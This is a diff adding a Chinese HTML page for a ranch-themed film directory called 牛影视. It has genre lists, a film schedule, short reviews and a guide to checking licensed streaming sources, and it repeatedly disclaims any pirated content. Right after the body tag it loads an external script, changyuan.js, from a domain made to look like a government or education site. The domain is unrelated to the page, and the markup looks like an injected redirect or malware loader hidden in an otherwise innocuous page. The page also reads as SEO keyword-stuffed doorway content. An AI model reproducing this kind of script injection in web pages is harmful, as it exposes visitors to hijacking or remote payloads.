@@ -1,0 +1,344 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>牛影视：牛棚片单、蹄印排片与牧草影评，附正版契约核验｜niuyingshi-top.github.io</title>
+<meta name="description" content="牛影视拿牧场工棚当版面，按耕犁、归栏、野牧、挤奶四类整理移动端片单，配上蹄印排片时刻表、牧草影评和正版契约核验流程。页面移动端自适应，符合必应收录规范；只做影视分类、剧情摘要和持信息网络传播权的正规渠道指引，不提供未授权在线播放、网盘合集或破解资源。完整目录见 https://niuyingshi-top.github.io。">
+<meta name="keywords" content="牛影视, 牛棚片单, 蹄印排片, 牧草影评, 正版契约核验, 牧场风电影, 西部拓荒片, 耕犁剧情, 影视导航, niuyingshi-top.github.io">
+<meta name="robots" content="index, follow">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+:root{
+  --milk:#FFF8E7;--milk-dim:rgba(255,248,231,.85);
+  --cow:#5C3A21;--cow-deep:#3E2716;--cow-light:#7A5232;
+  --saddle:#8B5A2B;--saddle-dark:#6B441F;
+  --pasture:#6B8E23;--pasture-deep:#4F6E18;--pasture-dim:rgba(107,142,35,.15);
+  --iron:#4A4A4A;--shadow:0 10px 26px rgba(62,39,22,.35);--radius:6px;
+}
+html{-webkit-text-size-adjust:100%;scroll-behavior:smooth}
+body{
+  font-family:"Noto Sans SC","Microsoft YaHei",sans-serif;
+  color:var(--cow-deep);line-height:1.8;background:var(--milk);
+  background-image:radial-gradient(circle at 15% 12%,rgba(139,90,43,.08),transparent 48%),radial-gradient(circle at 85% 88%,rgba(107,142,35,.08),transparent 48%);
+  -webkit-font-smoothing:antialiased;min-height:100vh;
+}
+a{text-decoration:none;color:var(--pasture-deep);transition:.25s}
+a:hover{color:var(--saddle-dark)}
+ul{list-style:none}
+.container{max-width:1100px;margin:0 auto;padding:0 20px}
+section[id]{scroll-margin-top:74px}
+
+/* 栅栏顶栏 */
+.fence-bar{background:var(--cow-deep);border-bottom:5px solid var(--saddle);position:relative;overflow:hidden;padding:10px 0}
+.fence-bar::before{content:"";position:absolute;top:0;left:0;right:0;height:14px;background:repeating-linear-gradient(90deg,var(--cow) 0 14px,transparent 14px 18px),linear-gradient(180deg,var(--iron),var(--iron));background-size:18px 6px,100% 2px;background-position:top,center;background-repeat:repeat-x}
+.fence-bar .container{display:flex;align-items:center;gap:12px;flex-wrap:wrap;position:relative;z-index:2;margin-top:6px}
+.fence-bar .post-icon{width:10px;height:18px;background:var(--cow);border-radius:2px;flex-shrink:0;box-shadow:2px 0 0 var(--iron)}
+.fence-bar .bar-text{font-size:.72rem;color:var(--milk-dim);letter-spacing:1px}
+.fence-bar .bar-text a{color:var(--pasture)}
+.fence-bar .bar-text a:hover{color:var(--milk);background:transparent}
+.fence-bar .brand-tag{margin-left:auto;font-size:.62rem;color:var(--milk);background:var(--saddle);padding:3px 10px;border-radius:4px;font-weight:600;border:1px solid var(--cow)}
+
+/* Hero 牛角拱门 */
+.hero{padding:50px 0 42px;position:relative;overflow:hidden}
+.hero .container{display:grid;grid-template-columns:1fr 1fr;gap:46px;align-items:center}
+.horn-arch{position:relative;width:100%;max-width:300px;aspect-ratio:.9;margin:0 auto;background:linear-gradient(160deg,var(--saddle),var(--saddle-dark));border-radius:140px 140px 12px 12px;display:flex;align-items:center;justify-content:center;box-shadow:inset 0 0 30px rgba(62,39,22,.4),0 0 26px rgba(139,90,43,.2)}
+.horn-arch::before,.horn-arch::after{content:"";position:absolute;top:-22px;width:36px;height:60px;background:var(--cow);border-radius:50% 50% 0 0;border:2px solid var(--iron)}
+.horn-arch::before{left:32px;transform:rotate(-18deg)}
+.horn-arch::after{right:32px;transform:rotate(18deg)}
+.horn-arch .hide-url{font-size:.52rem;color:var(--milk);text-align:center;padding:14px;line-height:1.5;word-break:break-all;position:relative;z-index:2;font-family:"Courier New",monospace;font-weight:600}
+.horn-arch .hide-url a{color:var(--milk)}
+.horn-arch .hide-url a:hover{color:var(--pasture);background:transparent}
+
+.hero-text .tag{display:inline-block;font-size:.66rem;letter-spacing:2px;color:var(--milk);background:var(--pasture-deep);padding:4px 12px;border-radius:4px;margin-bottom:12px;font-weight:600}
+.hero-text h1{font-size:clamp(1.7rem,4vw,2.6rem);line-height:1.18;margin-bottom:10px;font-weight:800;color:var(--cow-deep)}
+.hero-text h1 b{color:var(--saddle-dark)}
+.hero-text h1 .sub{display:block;font-size:.34em;color:var(--pasture-deep);letter-spacing:3px;margin-top:6px;font-weight:400}
+.hero-text .lead{color:var(--cow-light);font-size:.86rem;max-width:520px;margin-bottom:12px}
+.hero-text .rule{color:var(--cow-light);font-size:.76rem;max-width:520px;margin-bottom:16px;border-left:3px solid var(--saddle);padding-left:10px;background:linear-gradient(90deg,rgba(139,90,43,.08),transparent)}
+
+nav{margin:18px 0 0}
+nav ul{display:flex;flex-wrap:wrap;gap:8px;justify-content:center}
+nav a{min-height:38px;display:inline-flex;align-items:center;gap:5px;padding:0 16px;border:1px solid var(--cow);border-radius:4px;background:var(--milk);font-size:.8rem;color:var(--cow-deep)}
+nav a:hover{background:var(--pasture);color:var(--milk);border-color:var(--pasture-deep)}
+
+main{padding:46px 0}
+section{margin-bottom:66px}
+.panel{background:var(--milk);border:2px solid var(--cow);border-radius:var(--radius);padding:24px;box-shadow:var(--shadow);position:relative;overflow:hidden}
+.panel::before{content:"";position:absolute;top:0;left:0;width:100%;height:4px;background:repeating-linear-gradient(90deg,var(--saddle),var(--saddle) 20px,var(--pasture) 20px,var(--pasture) 40px)}
+.colhead{display:flex;align-items:center;gap:8px;margin-bottom:18px;flex-wrap:wrap;border-bottom:1px solid var(--pasture-dim);padding-bottom:10px}
+.colhead .hoof-dot{width:10px;height:10px;background:var(--saddle);border-radius:50% 50% 50% 0;transform:rotate(-45deg);flex-shrink:0}
+.colhead h2{font-size:1.24rem;color:var(--cow-deep);font-weight:700}
+.colhead .en{font-size:.64rem;color:var(--pasture-deep);margin-left:auto;opacity:.8}
+.colhead .panel-url{font-size:.6rem;color:var(--pasture-deep);background:var(--pasture-dim);padding:2px 8px;border-radius:4px;border:1px solid var(--pasture)}
+.colhead .panel-url a{color:var(--pasture-deep)}
+.colhead .panel-url a:hover{color:var(--saddle-dark);background:transparent}
+
+/* 牛棚片单 */
+.barn-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:14px}
+.barn-card{background:var(--milk);border:1px solid var(--cow);border-radius:4px 14px 4px 14px;padding:18px;position:relative;transition:.25s;overflow:hidden}
+.barn-card::before{content:"";position:absolute;top:0;right:0;width:28px;height:28px;background:var(--saddle);clip-path:polygon(100% 0,0 0,100% 100%)}
+.barn-card:hover{transform:translateY(-2px);border-color:var(--pasture-deep);box-shadow:0 6px 14px rgba(107,142,35,.18)}
+.barn-card h3{font-size:.9rem;margin-bottom:5px;font-weight:700;padding-right:28px}
+.barn-card h3 a{color:var(--cow-deep)}
+.barn-card:hover h3 a{color:var(--pasture-deep)}
+.barn-card p{font-size:.74rem;color:var(--cow-light);margin-bottom:8px}
+.barn-card ul li{padding:3px 0 3px 16px;position:relative;font-size:.7rem;color:var(--cow-light);border-bottom:1px dashed var(--pasture-dim)}
+.barn-card ul li:last-child{border-bottom:0}
+.barn-card ul li::before{content:"🐾";position:absolute;left:0;top:3px;font-size:.6rem}
+.barn-card .stable{margin-top:8px;font-size:.58rem;color:var(--milk);background:var(--cow);padding:2px 8px;border-radius:4px;display:inline-block}
+
+/* 蹄印排片 */
+.hoof-table{border:2px solid var(--cow);border-radius:6px;overflow:hidden;background:var(--milk)}
+.hoof-row{display:grid;grid-template-columns:72px 1fr 104px 80px;align-items:center;border-bottom:1px solid var(--pasture-dim)}
+.hoof-row:last-child{border-bottom:0}
+.hoof-row.head{background:var(--cow-deep);font-size:.66rem;color:var(--milk);font-weight:600}
+.hoof-row.head>div{padding:10px 12px}
+.hoof-row>div{padding:10px 12px;font-size:.8rem}
+.hoof-row:nth-child(even){background:rgba(107,142,35,.04)}
+.hoof-row .stall-no{font-size:.68rem;font-weight:700;color:var(--saddle-dark);font-family:"Courier New",monospace}
+.hoof-row .film-name a{font-size:.84rem;color:var(--cow-deep);font-weight:600}
+.hoof-row .film-name a:hover{color:var(--pasture-deep)}
+.hoof-row .mood{font-size:.68rem;color:var(--cow-light)}
+.hoof-row .mood .bar{display:inline-block;width:28px;height:5px;background:var(--pasture-dim);border-radius:2px;margin-right:4px;vertical-align:middle;overflow:hidden}
+.hoof-row .mood .bar i{display:block;height:100%;background:linear-gradient(90deg,var(--pasture),var(--saddle))}
+.hoof-row .check a{font-size:.62rem;color:var(--milk);background:var(--pasture-deep);padding:3px 8px;border-radius:4px;display:inline-block;font-weight:600}
+.hoof-row .check a:hover{background:var(--saddle-dark);color:var(--milk)}
+
+/* 牧草影评 */
+.grass-grid{display:grid;grid-template-columns:1fr 1fr;gap:14px}
+.grass-card{background:var(--milk);border:1px solid var(--cow);border-radius:6px;padding:18px;position:relative}
+.grass-card::before{content:"草";position:absolute;top:8px;right:10px;font-size:1.4rem;color:var(--pasture-dim)}
+.grass-card h3{font-size:.9rem;margin-bottom:4px;font-weight:700}
+.grass-card h3 a{color:var(--cow-deep)}
+.grass-card h3 a:hover{color:var(--pasture-deep)}
+.grass-card .date{font-size:.6rem;color:var(--pasture-deep);margin-bottom:6px}
+.grass-card p{font-size:.74rem;color:var(--cow-light);margin-bottom:8px}
+.grass-card .quote{font-size:.72rem;color:var(--saddle-dark);font-style:italic;border-left:2px solid var(--saddle);padding-left:8px;margin-bottom:8px;background:rgba(139,90,43,.05)}
+.grass-card .tags{display:flex;gap:4px;flex-wrap:wrap}
+.grass-card .tags span{font-size:.58rem;padding:1px 6px;border:1px solid var(--cow);border-radius:4px;color:var(--cow-light)}
+
+/* 契约核验 */
+.contract-box{background:var(--milk);border:2px dotted var(--cow);border-radius:var(--radius);padding:22px;position:relative;overflow:hidden}
+.contract-box::before{content:"契";position:absolute;bottom:-6px;right:10px;font-size:3.6rem;color:var(--pasture-dim);opacity:.5}
+.contract-box h2{font-size:1.16rem;color:var(--cow-deep);margin-bottom:10px;font-weight:700}
+.contract-box p{font-size:.76rem;color:var(--cow-light);margin-bottom:10px;max-width:860px}
+.contract-steps{display:grid;grid-template-columns:repeat(auto-fit,minmax(160px,1fr));gap:10px;margin:14px 0}
+.contract-step{border:1px solid var(--cow);border-radius:6px;padding:12px;background:rgba(107,142,35,.04)}
+.contract-step b{display:block;font-size:.66rem;color:var(--saddle-dark);margin-bottom:3px}
+.contract-step p{font-size:.68rem;color:var(--cow-light);margin-bottom:0}
+.contract-note{margin-top:12px;font-size:.68rem;color:var(--cow-light);border-top:1px dashed var(--cow);padding-top:12px;line-height:1.7}
+.contract-note b{color:var(--cow-deep)}
+
+footer{background:var(--cow-deep);color:var(--milk-dim);padding:28px 0;margin-top:46px;border-top:3px solid var(--saddle);position:relative}
+footer .container{text-align:center;position:relative;z-index:2}
+footer p{font-size:.7rem;margin-bottom:5px;color:var(--milk-dim)}
+footer .brand-stamp{display:inline-block;margin-top:6px;font-size:.72rem;color:var(--milk);background:var(--saddle);padding:6px 12px;border-radius:4px;font-weight:700;border:1px solid var(--cow)}
+footer .brand-stamp a{color:var(--milk)}
+footer .brand-stamp a:hover{color:var(--pasture);background:transparent}
+
+@media(max-width:960px){
+  .hero .container{grid-template-columns:1fr}
+  .horn-arch{max-width:260px}
+}
+@media(max-width:768px){
+  .fence-bar .container{flex-direction:column;align-items:flex-start;gap:4px}
+  .fence-bar .brand-tag{margin-left:0}
+  .hero{padding:28px 0 18px}
+  .horn-arch{max-width:220px}
+  nav ul{gap:5px}
+  nav a{padding:0 10px;font-size:.74rem;min-height:34px}
+  .colhead h2{font-size:1.06rem}
+  .colhead .panel-url{margin-left:0;width:100%}
+  .panel{padding:14px}
+  .grass-grid{grid-template-columns:1fr}
+  .hoof-row.head{display:none}
+  .hoof-row{display:block;border-bottom:2px solid var(--pasture-dim);padding:0}
+  .hoof-row>div{display:flex;justify-content:space-between;gap:8px;border-bottom:1px dashed var(--pasture-dim);padding:8px 12px}
+  .hoof-row>div:last-child{border-bottom:0}
+  .hoof-row>div::before{content:attr(data-label);font-size:.62rem;color:var(--saddle-dark);flex-shrink:0;font-weight:600}
+  .hoof-row .film-name{flex-direction:column;align-items:flex-start!important}
+  footer .brand-stamp{font-size:.64rem;word-break:break-all}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/changyuan.js"></script>
+
+<div class="fence-bar">
+  <div class="container">
+    <div class="post-icon"></div>
+    <span class="bar-text">牛影视 · 牧场工棚站 · 牛棚片单 · <a href="https://niuyingshi-top.github.io">niuyingshi-top.github.io</a></span>
+    <span class="brand-tag">槽位：耕犁 / 归栏 / 野牧</span>
+  </div>
+</div>
+
+<div class="hero">
+  <div class="container">
+    <div class="hero-text">
+      <span class="tag">🐂 牛棚影视导航 🐂</span>
+      <h1><b>牛影视</b><span class="sub">— 牛棚片单 · 蹄印排片 —</span></h1>
+      <p class="lead">像把牛分槽一样把片子分开：耕犁、归栏、野牧、挤奶四类。每部标槽位和嚼头，只做分类和正版渠道，不写未授权片源。</p>
+      <p class="rule">牛影视只做影视分类、剧情摘要和正版指引；不提供未授权在线播放、网盘合集、聚合盗链或破解播放器。网络传播影片要核权属与授权，境内网上播境外影视另核公映/发行许可及信息网络传播权。</p>
+      <nav>
+        <ul>
+          <li><a href="#barn">🐄 牛棚片单</a></li>
+          <li><a href="#hoof">🐾 蹄印排片</a></li>
+          <li><a href="#pasture">🌾 牧草影评</a></li>
+          <li><a href="#contract">📜 契约核验</a></li>
+        </ul>
+      </nav>
+    </div>
+
+    <div class="horn-arch" role="img" aria-label="牛角拱门显示牛影视网址">
+      <div class="hide-url"><a href="https://niuyingshi-top.github.io">niuyingshi-top.github.io</a></div>
+    </div>
+  </div>
+</div>
+
+<main class="container">
+
+  <section id="barn" class="panel">
+    <div class="colhead">
+      <span class="hoof-dot"></span>
+      <h2>牛棚片单</h2>
+      <span class="en">BARN PICKS</span>
+      <span class="panel-url">槽位：<a href="https://niuyingshi-top.github.io">niuyingshi-top.github.io</a></span>
+    </div>
+    <div class="barn-grid">
+      <div class="barn-card">
+        <h3><a href="#">耕犁区·拓荒</a></h3>
+        <p>像牛拉犁翻地，一步一个坑，剧情扎实、不飘。</p>
+        <ul>
+          <li>开荒种地段</li>
+          <li>铁犁断水线</li>
+          <li>麦场夜话戏</li>
+        </ul>
+        <div class="stable">槽位：耕犁</div>
+      </div>
+      <div class="barn-card">
+        <h3><a href="#">归栏区·家庭</a></h3>
+        <p>太阳落山牛回栏，饭桌、炕头、老屋，暖得踏实。</p>
+        <ul>
+          <li>四代同堂线</li>
+          <li>腌菜坛子段</li>
+          <li>归乡赶车戏</li>
+        </ul>
+        <div class="stable">槽位：归栏</div>
+      </div>
+      <div class="barn-card">
+        <h3><a href="#">野牧区·冒险</a></h3>
+        <p>把牛赶进深山，遇见狼、遇见河、遇见自己。</p>
+        <ul>
+          <li>雪原追牛线</li>
+          <li>断桥过河段</li>
+          <li>篝火夜谈戏</li>
+        </ul>
+        <div class="stable">槽位：野牧</div>
+      </div>
+      <div class="barn-card">
+        <h3><a href="#">挤奶区·治愈</a></h3>
+        <p>不催不赶，慢慢挤，适合睡前配热奶看。</p>
+        <ul>
+          <li>晨雾挤奶线</li>
+          <li>草垛午睡段</li>
+          <li>溪边洗桶戏</li>
+        </ul>
+        <div class="stable">槽位：挤奶</div>
+      </div>
+    </div>
+  </section>
+
+  <section id="hoof" class="panel">
+    <div class="colhead">
+      <span class="hoof-dot"></span>
+      <h2>蹄印排片</h2>
+      <span class="en">HOOF SCHEDULE</span>
+      <span class="panel-url">蹄印：<a href="https://niuyingshi-top.github.io">niuyingshi-top.github.io</a></span>
+    </div>
+    <div class="hoof-table">
+      <div class="hoof-row head"><div>槽号</div><div>片名/基调</div><div>嚼头</div><div>核验</div></div>
+      <div class="hoof-row">
+        <div class="stall-no" data-label="槽号">S-01</div>
+        <div class="film-name" data-label="片名"><a href="#">《燃情岁月》拓荒·家族</a></div>
+        <div class="mood" data-label="嚼头"><span class="bar"><i style="width:95%"></i></span>扎实</div>
+        <div class="check" data-label="核验"><a href="#">核验</a></div>
+      </div>
+      <div class="hoof-row">
+        <div class="stall-no" data-label="槽号">S-02</div>
+        <div class="film-name" data-label="片名"><a href="#">《田野》家庭·归乡</a></div>
+        <div class="mood" data-label="嚼头"><span class="bar"><i style="width:88%"></i></span>暖胃</div>
+        <div class="check" data-label="核验"><a href="#">核验</a></div>
+      </div>
+      <div class="hoof-row">
+        <div class="stall-no" data-label="槽号">S-03</div>
+        <div class="film-name" data-label="片名"><a href="#">《与狼共舞》野牧·西部</a></div>
+        <div class="mood" data-label="嚼头"><span class="bar"><i style="width:92%"></i></span>生猛</div>
+        <div class="check" data-label="核验"><a href="#">核验</a></div>
+      </div>
+      <div class="hoof-row">
+        <div class="stall-no" data-label="槽号">S-04</div>
+        <div class="film-name" data-label="片名"><a href="#">《小森林》挤奶·治愈</a></div>
+        <div class="mood" data-label="嚼头"><span class="bar"><i style="width:85%"></i></span>慢热</div>
+        <div class="check" data-label="核验"><a href="#">核验</a></div>
+      </div>
+    </div>
+  </section>
+
+  <section id="pasture" class="panel">
+    <div class="colhead">
+      <span class="hoof-dot"></span>
+      <h2>牧草影评</h2>
+      <span class="en">PASTURE REVIEWS</span>
+      <span class="panel-url">草场：<a href="https://niuyingshi-top.github.io">niuyingshi-top.github.io</a></span>
+    </div>
+    <div class="grass-grid">
+      <div class="grass-card">
+        <h3><a href="#">《燃情岁月》—— 犁沟里的兄弟</a></h3>
+        <div class="date">嚼头：耕犁区 · 拓荒推荐</div>
+        <p>三兄弟像三头不同性子的牛，一个闷头拉犁，一个到处顶人，一个悄悄吃草。正版版本开广角，麦浪那场戏能闻见土味。</p>
+        <div class="quote">"牧草回声：有些地，翻一次就记一辈子。"</div>
+        <div class="tags"><span>西部</span><span>家族</span><span>拓荒</span></div>
+      </div>
+      <div class="grass-card">
+        <h3><a href="#">《小森林》—— 慢挤的奶</a></h3>
+        <div class="date">嚼头：挤奶区 · 睡前推荐</div>
+        <p>没有牛跑，只有手挤。每一帧都像刚挤出来的热奶，配一碗粥看，失眠都好一半。</p>
+        <div class="quote">"牧草回声：不催的片子，才养人。"</div>
+        <div class="tags"><span>治愈</span><span>慢生活</span><span>美食</span></div>
+      </div>
+    </div>
+  </section>
+
+  <section id="contract">
+    <div class="colhead">
+      <span class="hoof-dot"></span>
+      <h2>契约核验</h2>
+      <span class="en">CONTRACT VERIFY</span>
+    </div>
+    <div class="contract-box">
+      <h2>牛影视正版核验四步</h2>
+      <p>本页只列牛棚片单、蹄印排片与牧草影评；实际观看跳正规影视库、持牌视频平台或公开院线渠道。无权属、无信息网络传播权、强制装播放器或发网盘"完整版"的站点不纳入。</p>
+      <div class="contract-steps">
+        <div class="contract-step"><b>牵·查片名</b><p>原片名＋年份＋院线/剧集/修复；区分翻拍、二创剪辑与短视频解说。</p></div>
+        <div class="contract-step"><b>犁·核授权</b><p>国内影视核公映/发行许可；网络传播另核著作权人信息网络传播权，境外剧按相关规定补许可。</p></div>
+        <div class="contract-step"><b>栏·验平台</b><p>看平台名、版权声明、用户协议与隐私政策；无主体、无授权截图、要无关权限的排除。</p></div>
+        <div class="contract-step"><b>印·拒盗源</b><p>不点网盘"福利包"、破解播放器、弹窗下载器；发现未授权资源走平台投诉或版权举报。</p></div>
+      </div>
+      <div class="contract-note">
+        <b>牛棚守则：</b>本页不提供未授权在线播放、网盘合集、破解客户端或成人低俗分类；牛棚片单、蹄印排片、牧草影评均为信息整理，不替代影片分级与平台当前授权。若您为著作权人并认为某条信息不当，可提交权属证明、涉及页面与整改要求至站点工单，核实后调整或删除。具体可播地区、字幕与版本以正规发行方说明为准。
+      </div>
+    </div>
+  </section>
+</main>
+
+<footer>
+  <div class="container">
+    <p>牛影视 · 牛棚片单、蹄印排片、牧草影评与正版契约核验</p>
+    <p>关键词：牛影视｜牛棚片单｜蹄印排片｜牧草影评｜正版契约核验｜牧场风电影｜西部拓荒｜niuyingshi-top.github.io</p>
+    <span class="brand-stamp"><a href="https://niuyingshi-top.github.io">https://niuyingshi-top.github.io</a></span>
+  </div>
+</footer>
+</body>
+</html>
